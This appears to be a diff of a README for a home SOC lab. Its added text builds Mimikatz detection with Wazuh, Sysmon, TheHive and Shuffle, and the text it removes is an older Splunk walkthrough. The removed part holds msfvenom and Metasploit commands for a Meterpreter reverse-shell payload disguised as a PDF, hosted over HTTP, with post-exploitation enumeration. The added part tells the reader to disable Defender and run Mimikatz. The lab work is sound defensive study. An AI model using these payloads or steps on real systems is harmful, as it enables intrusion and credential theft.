@@ -402,194 +402,342 @@ You should now see:
 
 ---  
 
+## Step 6: Windows 10 Telemetry Configuration 🖥️🔍
+In this step, we configure Windows 10 telemetry to send Sysmon and event logs to the Wazuh Manager for analysis.  
+
+1️⃣ Editing ossec.conf File 📄  
+-> Navigate to:  
+
+    C:\Program Files (x86)\ossec-agent
+-> Locate the ossec.conf file.  
+-> 🛠️ Open Notepad as Administrator and edit ossec.conf.  
+✅ In the <client> tag, verify the <server> address points to the Wazuh Manager’s IP:  
+
+    <server>
+      <address>10.53.159.19</address>
+    </server>
+
+2️⃣ Configuring Log Collection 📝  
+-> Locate <localfile> tags and remove defaults:  
+
+    <localfile>
+      <location>Application</location>
+    </localfile>
+    
+    <localfile>
+      <location>Security</location>
+    </localfile>
+🆕 Replace with Sysmon Operational Log:  
+
+    <localfile>
+      <location>Microsoft-Windows-Sysmon/Operational</location>
+      <log_format>eventchannel</log_format>
+    </localfile>
+
+3️⃣ Creating Backup 💾  
+-> Before editing, create a backup:  
+
+    copy "C:\Program Files (x86)\ossec-agent\ossec.conf" "C:\Program Files (x86)\ossec-agent\ossec-backup.conf"
+-> 🛡️ This allows you to restore the original config if needed.  
+
+4️⃣ Restarting Wazuh Agent 🔄  
+-> Open Services → find Wazuh Agent → click Restart.  
+✅ This applies the new configuration.  
 
 
+5️⃣ Preparing Windows 10 for Testing 🖱️  
+-> Open Windows Security → Virus & Threat Protection.  
+🛑 Temporarily disable Real-Time Protection so Mimikatz is not blocked.  
+-> In Chrome → Settings → Privacy & Security, select No Protection (just for downloading).  
+-> ⬇️ Download Mimikatz from GentilKiwi/Mimikatz GitHub  
+-> 📂 Extract the ZIP file.  
+
+6️⃣ Running Mimikatz ⚡  
+-> Open PowerShell as Administrator and run:  
+
+    cd C:\Users\<User>\Downloads\mimikatz_trunk\x64
+    .\mimikatz.exe
+-> ✅ You should now see the Mimikatz console.  
+
+7️⃣ Enabling Full Logging on Wazuh Manager 🖥️  
+Run these commands on Ubuntu server:  
+
+    # Create backup
+    cp /var/ossec/etc/ossec.conf /var/ossec/etc/ossec-backup.conf
+    
+    # Edit configuration
+    nano /var/ossec/etc/ossec.conf
+Change inside <global>:  
+
+    <logall>yes</logall>
+    <logall_json>yes</logall_json>
+💾 Save → restart Wazuh:  
+
+    systemctl restart wazuh-manager.service
 
 
+8️⃣ Configuring Filebeat for Archives 📊  
+Edit Filebeat config:  
+
+    nano /etc/filebeat/filebeat.yml
+Change:  
+
+    archives:
+      enabled: false
+to:  
+
+    archives:
+      enabled: true
+Restart Filebeat:  
+
+    systemctl restart filebeat
 
 
+9️⃣ Creating Index Pattern in Wazuh Dashboard 🖼️  
+-> Go to Stack Management → Index Patterns.  
+-> ➕ Create new pattern: wazuh-archives-*  
+-> Select @timestamp as time field.  
+-> ✅ Save and switch to this pattern.  
+
+🔟 Viewing Mimikatz Logs 👀  
+Run Mimikatz again on Windows 10.  
+On Wazuh Manager:  
+
+    cd /var/ossec/logs/archives
+    cat archives.json | grep -i mimikatz
+✅ You should now see logs showing Mimikatz activity.  
 
 
+1️⃣1️⃣ Focus on Original File Name 🔎  
+Inside the logs, look for:  
 
+    "data.win.eventdata.originalFileName": "mimikatz.exe"
+💡 Tip: This field is more reliable than image because attackers may rename the executable.  
 
-
-
-
-
-
-
-
-
-
-
-
-               
-
-## 🚀 Step 6: 🎯 Payload Delivery & Exploitation Attempt
-  With RDP (3389) now open 🔓, I moved on to creating and delivering a malicious payload for exploitation.  
-  🛠 Payload Creation (MSFvenom)  
-
-    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.3 LPORT=4444 -f exe -o ProjectReport.pdf.exe  
-
-💡 Payload: Windows Meterpreter Reverse TCP  
-📍 LHOST: Attacker machine IP  
-📍 LPORT: Listener port for reverse shell  
-
-📡 Setting Up the Listener (Metasploit)  
-
-    msfconsole  
-    use exploit/multi/handler  
-    set PAYLOAD windows/meterpreter/reverse_tcp  
-    set LHOST 192.168.56.3  
-    set LPORT 4444  
-    exploit  
-🎯 Waiting for the target to execute the payload...  
-
-🌐 Hosting Payload with Python  
-To easily transfer the file to the target, I started a Python HTTP server:  
-
-    python3 -m http.server 9999  
-
-📂 Payload hosted at:  
-
-    http://192.168.56.3:9999/ProjectReport.pdf.exe  
-📸 Result:  
-    Payload successfully hosted & accessible ✅  
-R    eady for delivery to target 🎯 (execution attempt covered in the next step)   
-
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/3e75489f-aa7b-4aa8-abca-54ea410ca2d7" alt="LAN Segment & IP settings" width="250" height="199"/>
-  <img src="https://github.com/user-attachments/assets/b384ec69-3a8b-4c68-9cf5-a01ae3a25b9f" alt="VMware Settings" width="250" height="199"/>
-  <img src="https://github.com/user-attachments/assets/2d1547f3-8caa-4233-88ec-084f942687f1" alt="VMware Settings" width="250" height="199"/>
-</p>
-
----  
-
-## 🖥️ Step 7: 🎯 Payload Delivery & Reverse Shell Gained
-  💻 On Target (Windows 10):  
-    1️⃣ Opened browser → http://192.168.56.3:9999 🌐  
-    2️⃣ Downloaded projectreport.pdf 📄 (actually projectreport.pdf.exe 🐍 — .exe hidden)  
-    3️⃣ ⚠️ Chrome Warning: “File contains malware” — Ignored & kept file  
-    4️⃣ ⚠️ Windows Defender Alert: “File may be harmful” — Chose to run anyway 🛑  
-
-  💥 Execution & Shell Access  
-  Upon execution, reverse TCP connection established 🔗  
-  Meterpreter session opened on Kali 🎉  
-
-  🔍 Post-Exploitation Actions  
-  Inside Meterpreter:  
-
-      ls  
-      shell  
-      ipconfig  
-      ipconfig /all  
-      net localgroup  
-      net user  
-
-  📌 Gathered network info, checked user accounts, and enumerated privileges 👀  
-
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/ca0e12ba-a017-4a4f-9d0b-b420e156b3ca" alt="LAN Segment & IP settings" width="250" height="199"/>
-  <img src="https://github.com/user-attachments/assets/9a5db2c0-4e8e-431e-9fb3-7a66d3c37968" alt="VMware Settings" width="250" height="199"/>
-  <img src="https://github.com/user-attachments/assets/0eaa2f31-45c5-4fe3-afab-6fe42176bf5a" alt="VMware Settings" width="250" height="199"/>
-</p>
-
----  
-
-## 📊 Step 8: Splunk Analysis of Malware Execution 🕵️‍♂️
-  💡 Objective: Track malware activity (projectreport.pdf.exe) using Splunk Search & Reporting.  
-  🛠️ Actions Performed  
-  1️⃣ Opened Splunk → Search & Reporting App 📈  
-  2️⃣ Ran initial search:  
-
-      index=endpoint  
-  🔍 (endpoint was the index created earlier to store endpoint logs — including Sysmon data)  
-  3️⃣ Located multiple logs for system activities.  
-  4️⃣ Focused search to find malware traces:  
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/03c42cf9-6fd0-40eb-a969-849e7c6e6a43" alt="LAN Segment & IP settings" width="350" height="250"/>
-</p>
-
-    index=endpoint "projectreport.pdf.exe"  
-  📌 Found several logs related to the file execution.  
-  5️⃣ Opened a specific log → copied Process GUID 🆔  
-  6️⃣ Queried again with the GUID:  
-  
-      index=endpoint "<Process_GUID>"  
-  📊 Retrieved detailed logs of the malware process lifecycle.  
-  7️⃣ Refined output with table formatting for clarity:  
-
-    index=endpoint "<Process_GUID>"  | table _time, parent_process, image, command_line  
-
-  🖥️ Columns included:  
-    _time ⏱️ — Timestamp of event  
-    parent_process 🏗️ — Process that spawned this activity  
-    image 🖼️ — Executable file path  
-    command_line 💻 — Full execution command  
-
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/69f2784d-7fe3-4a02-aacd-1a3a98ba3655" alt="LAN Segment & IP settings" width="350" height="250"/>
-</p>
-
-📌 Result :   
-    ✅ Successfully correlated malware file execution with process hierarchy and timeline.  
-    ✅ Identified parent process, child process, full path, and execution command for forensic reporting.  
+📷 [Placeholder for Event Viewer Screenshot]
+📷 [Placeholder for Wazuh Dashboard Screenshot with Mimikatz Logs]
 
 ---  
 
-## 🛠️ Step 9: Created a Dashboard for Better Understanding
-Designed and implemented a comprehensive Splunk dashboard to visualize key security metrics and events. This dashboard includes charts for top source IPs, destination ports, user logons, process executions, suspicious parent-child process relationships, reverse shell indicators, registry key changes, and detailed endpoint logs. It helps in monitoring and quickly identifying potential security incidents during the SOC lab exercises.
+## Step 7: Rule Creation in Wazuh 🛡️📜  
+In this step, we create a custom rule in Wazuh to detect Mimikatz execution based on Sysmon logs.  
 
-<img width="1904" height="500" alt="Dashboard_graphs" src="https://github.com/user-attachments/assets/555803d1-8449-4495-9118-12fb5ab0ae54" />
+1️⃣ Navigating to Rules Section 🧭  
+-> Open Wazuh Dashboard.  
+-> Click the dropdown button (⏬) next to “Wazuh” → Sidebar Opens.  
+-> Navigate to: Management → Rules.  
 
+2️⃣ Finding the Target Rule 🔍  
+-> Click Manage Rules Files.  
+-> Search for Sysmon Rules → locate:  
+
+    0800-sysmon_no_id_1.xml
+-> Reason for choosing Event ID 1 🧠:  
+   Sysmon Event ID 1 corresponds to Process Creation Events.  
+   ✅ This means every time a new process/executable starts, Sysmon generates an Event ID 1 log.  
+    This makes it ideal for catching tools like Mimikatz as soon as they run.  
+
+3️⃣ Creating Custom Rule File ✏️  
+-> Open the rule file → Copy the <rule> block from sysmon_no_id_1.xml.  
+-> Go back → Click Custom Rules → Edit local_rules.xml file.  
+
+4️⃣Paste and Modifying the Rule 🛠️
+Inside local_rules.xml paste the copied rule below the existing rule:
+-> 🔢 Change Rule ID → must be greater than 100001.  
+    Example:  
+
+    <rule id="100002" level="15">
+-> 🔝 Set Level: 15 (highest severity).  
+-> 🏷️ Group Tag: Keep sysmon_event1 (since we are targeting process creation).  
+-> 🎯 Field Tag: Change from parentImage to originalFileName and update pattern:  
+
+    <field name="win.eventdata.originalFileName" type="pcre2">(?i)mimikatz\.exe</field>
+-> 🗑️ Remove <options> tag (not required).  
+-> 📝 Description Tag:  
+
+    <description>Mimikatz usage detected</description>
+-> 🧠 MITRE Technique Tag: Change to T1003 (Credential Dumping).  
+
+    <mitre> <id>T1003</id> </mitre>
+
+5️⃣ Saving and Restarting Wazuh 🔄  
+-> Save changes.  
+-> Click Restart on the Wazuh Dashboard to apply the rule.  
+
+6️⃣ Testing the Rule 🧪  
+-> On Windows 10 VM → Run Mimikatz again:  
+
+    cd C:\Users\<User>\Downloads\mimikatz_trunk\x64
+    .\mimikatz.exe
+-> ✅ Result:  
+
+    Wazuh Dashboard shows a new alert:
+    “Mimikatz usage detected” 🔥
+
+📷 [🖼️ Screenshot Placeholder: Wazuh Dashboard showing Custom Rule Alert]
+---  
+
+
+
+## Step 8: Shuffle Integration & Workflow Automation 🔄  
+In this step, we integrate Shuffle with Wazuh, VirusTotal, and TheHive, and configure automated workflows that send email alerts to SOC analysts when malicious activity (Mimikatz usage) is detected.  
+
+8.1 – Shuffle Setup 🖥️  
+-> Open Shuffle on the Ubuntu VM where Hive is installed (instead of using host machine) — this ensures proper connectivity since cloud runtime was not able to connect with Hive.  
+-> Log in to Shuffle ➝ Navigate to Admin tab ➝ Select Locations.  
+-> Click Add Location ➝ Name: local-env ➝ Type: on-prem ➝ Save.  
+-> Click Make Default ✅.  
+-> Go back to Workflows ➝ Create a new workflow:  
+
+    Name: SOC Automation Project
+    Description: MySocLab
+    Select any use case ➝ Done.
+-> A new canvas opens with the ChangeMe icon.  
+
+8.2 – Webhook Setup 🔗  
+-> Click on Triggers ➝ Drag and drop Webhook onto the canvas.  
+-> It auto-connects to ChangeMe.  
+-> Configure:  
+
+    Name: Wazuh.alerts
+    Copy the Webhook URI.
+-> Save ✅.  
+
+8.3 – Connect Wazuh to Shuffle 🛜  
+On Ubuntu server:  
+
+    sudo nano /var/ossec/etc/ossec.conf
+-> Under <global> tag, add:  
+
+    <integration>
+      <name>custom-integration</name>
+      <hook_url>PASTE_WEBHOOK_URL_HERE</hook_url>
+      <rule_id>100002</rule_id>
+      <alert_format>json</alert_format>
+    </integration>
+-> Save & restart:  
+
+    sudo systemctl restart wazuh-manager.service
+    sudo systemctl status wazuh-manager.service
+-> Confirm Wazuh manager is running.  
+
+8.4 – Triggering the Workflow 🚀  
+-> On Windows 10 VM ➝ Run Mimikatz to generate alerts.  
+-> On Shuffle ➝ Click Webhook Start ➝ Click Run (person icon).  
+-> Confirm Wazuh logs are reaching Shuffle ➝ Expand execution arguments to inspect raw logs.  
+
+8.5 – Parse SHA-256 Hash (Regex) 🔍  
+Reason for Parsing Hash:  
+We parse the hash to isolate only the SHA-256 value from the alert data. If we send unparsed data to VirusTotal, it may contain extra fields (like sha1= or md5=), causing incorrect or failed enrichment. Regex ensures we send a clean, valid hash to VirusTotal.  
+-> Change ChangeMe action ➝ Select Regex Capture Group.  
+-> Input: Input.data: $exec.text.win.evendata.hashes  
+Regex:  
+
+    sha256=([0-9a-fA-F]{64})
+-> Rename action to sha256_regex.  
+-> Save & rerun workflow ➝ Confirm parsed hashes in execution output ✅.  
+
+
+8.6 – VirusTotal Integration 🧪  
+-> In Shuffle ➝ Apps ➝ Search & drag VirusTotal ➝ Connect sha256_regex ➝ Configure:  
+
+    Action: Get a hash report
+    Authentication:
+    -> Name: auth_virustotal
+    -> API Key: (paste from VirusTotal account)
+    -> API URL: https://www.virustotal.com
+    Hash Parameter: Select runtime argument ➝ groups ➝ list.
+-> Save & rerun ➝ Verify VirusTotal status = Success.  
+-> Inspect output ➝ Confirm field last_analysis_stats.malicious returns a value like 67.  
+
+
+8.7 – Configure TheHive 🐝  
+In thehive I created a new organization and under the new Organization I created 2 users.  
+Why I created 2 users?  
+We created two users (one analyst, one service account) to follow principle of least privilege:  
+-> Analyst User: For human interaction with Hive UI and case management.  
+-> Service Account (Shuffle): For API integration and automation — given only necessary permissions.  
+
+Steps:  
+-> Log into Hive ➝ Create new Organization (SOCProject).  
+
+    Add:
+    User 1:
+    Type: Normal
+    Login: soc@test.com
+    Role: Analyst
+    
+    User 2 (Service):
+    Type: Service
+    Login: shuffle@test.com
+    Role: Analyst
+    Generate API key ➝ Copy & store securely.
+
+-> Logout ➝ Test login with Analyst user to confirm.  
+
+In Shuffle:  
+-> Authenticate Hive ➝ Paste API key + Hive IP ➝ Submit.  
+-> Find Actions: Create Alert.  
+-> Configure parameters:  
+
+    Description:
+    Mimikatz detected on host ➕ runtime arg (host) ➕ from user ➕ runtime arg (user)
+    Source: Wazuh
+    SourceRef: "rule:100002"
+    Severity: 2
+    Status: new
+    Tags: ["T1003"]
+    Summary: Mimikatz activity detected on host <hostname>
+    Process ID & Command line: Select from runtime args.
+    TLP: 2
+    Type: internal
+-> Save & rerun ➝ Confirm Hive alert is generated ✅.  
+
+8.8 – Email Notification Setup 📧  
+-> In Shuffle ➝ Apps ➝ Search for Email ➝ Drag & connect VirusTotal to the Email.  
+-> Configure:  
+
+    Recipient: Analyst mail address
+    Subject: Mimikatz Detected
+    Body: Include runtime arguments for:
+    Time : Runtime Argument(utcTime)
+    Host : Runtime Argument(computer)
+    Title : Runtime Argument(title)
+    Severity : Runtime Argument(severity)
+-> Save & rerun ➝ Check your inbox ➝ Confirm alert email received ✅.  
 
 ---  
 
-## 🔍 Step 10: Correlating Reverse Shell Activity with Splunk Logs 🖥️💣
-💡 Objective: Map the attacker’s actions (Meterpreter session) to endpoint telemetry collected by Splunk for full visibility.  
+## 🎯 Outcome  
+After completing all steps, we successfully:  
+-> ✅ Detected Mimikatz Execution: Our custom Sysmon rule (ID 100002) flagged Mimikatz execution in real-time.  
+-> 📢 Alert Generated in Wazuh: The alert was automatically triggered in Wazuh with severity 2 (Medium) and proper tagging T1003 (Credential Dumping).  
+-> 🗂️ Case Created in TheHive: TheHive automatically created a case with detailed description, process ID, host, and command line arguments for analyst review.  
+-> 📧 Email Notification: SOC Analyst received a live email with all relevant details including time, host, and command line.  
+-> 🤖 Automated Workflow: Full end-to-end SOAR workflow was validated from detection → alerting → case creation → email notification.  
 
-🛠️ Actions Performed  
-1️⃣ From Step 7, we had a Meterpreter session opened after executing projectreport.pdf.exe.  
-2️⃣ We already had the Process GUID for the malware execution from Step 8.  
-This GUID was used as the pivot point to find related activity.  
-3️⃣ Ran a broader search in Splunk to catch all processes spawned after the malware execution:  
+---
 
-    index=endpoint "<Process_GUID>" OR parent_process="<Malware_Process_Path>"  
-📌 This helped reveal not only the malware process but also child processes triggered by it.  
+## 🚀 Next Step & Future Enhancements  
+🔜 Short Term Plans:  
+-> 🛡️ Add more detection rules for other ATT&CK techniques (e.g., keylogging, lateral movement).  
+-> 🌐 Integrate Threat Intelligence feeds into TheHive for enrichment and context.  
+-> 📊 Configure dashboards to visualize alerts over time and severity trends.  
+🌟 Long Term Enhancements:  
+-> 🔒 Enable automatic response actions like isolating compromised hosts or disabling accounts.  
+-> 🤖 Implement AI/ML models to prioritize alerts and detect anomalies faster.  
+-> 🔗 Add integrations with SIEMs (Splunk, ELK) and EDR tools for unified monitoring.  
+-> 📁 Maintain rule baselines and version control (GitHub repo) for better team collaboration.  
 
-4️⃣ Looked specifically for commands that matched the attacker’s actions:  
-ipconfig, net user, net localgroup 🧾  
-These would appear in logs as part of cmd.exe or powershell.exe executions.  
-5️⃣ Refined query for command-line activities:  
-
-    index=endpoint ("ipconfig" OR "net user" OR "net localgroup") | table _time, parent_process, image, command_line  
-
-💡 This showed:  
-Timestamps matching when commands were run in Meterpreter shell.  
-Parent process as cmd.exe launched by the malware.  
-6️⃣ Cross-checked the timeline of these events with the reverse shell timestamps in Kali Linux MSF console to validate correlation ✅.  
-
-📌 Result  
-✅ Successfully confirmed that the attacker’s shell commands directly originated from the malware execution process.  
-✅ Created a full forensic chain:  
-File Download → Execution → Reverse Shell → Commands → Detection in Splunk 🔄  
-
----  
-
-## 🚀 Next Steps & Future Enhancements  
-🔍 Option 1: Deploy ELK Stack for deeper, faster, and more flexible log analysis — fully customized for your environment.  
-🛡️ Option 2: Deploy Wazuh SIEM (built on ELK) for advanced threat detection, automated correlation rules, and ready-made SOC dashboards.  
-🐍 Use Python automation scripts to streamline the attack workflow.  
-📟 Build a more advanced SOC dashboard that triggers real-time alerts when suspicious signatures, malware patterns, or specific attack indicators are detected — allowing analysts to respond instantly.  
-
----  
+---
 
 ## 🏁 Conclusion  
-Through this project, we were able to:  
-🏗️ Build a fully functional cybersecurity home lab  
-💣 Simulate & analyze malware-based attacks  
-📊 Leverage Splunk for effective threat detection and incident investigation  
-⚠️ Disclaimer: This work is strictly for educational purposes. Any unauthorized use of these methods is illegal and unethical.  
+This project successfully demonstrated end-to-end SOC automation using Wazuh + Sysmon + TheHive + Shuffle.  
+With this setup:  
+-> ⏱️ We can now detect attacks like Mimikatz in near real-time.  
+-> 🧑‍💻 Automatically create incidents and notify analysts.  
+-> 📈 Build a scalable workflow that grows with new detection rules and playbooks.  
+✨ Impact: This solution significantly reduces MTTD (Mean Time to Detect) and MTTR (Mean Time to Respond), allowing analysts to focus on real threats rather than repetitive tasks.  
 
 ---  
 
